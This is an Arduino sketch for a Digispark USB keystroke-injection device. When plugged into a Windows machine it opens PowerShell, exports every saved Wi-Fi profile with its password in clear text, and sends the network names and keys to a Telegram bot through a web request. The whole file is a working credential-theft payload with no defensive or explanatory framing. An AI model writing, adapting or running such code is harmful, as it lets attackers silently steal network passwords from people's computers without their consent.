#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(3000);  

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("$null=netsh wlan export profile key=clear;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("$msg=(Get-ChildItem *.xml|%{$x=[xml](Get-Content $_);\"$($x.WLANProfile.SSIDConfig.SSID.name):$($x.WLANProfile.MSM.Security.sharedKey.keymaterial)\"}) -join ' | ';");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  DigiKeyboard.print("Invoke-WebRequest \"https://api.telegram.org/<BOT-TOKEN>/sendMessage?chat_id=<CHAT-ID>&text=$msg\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Null
}
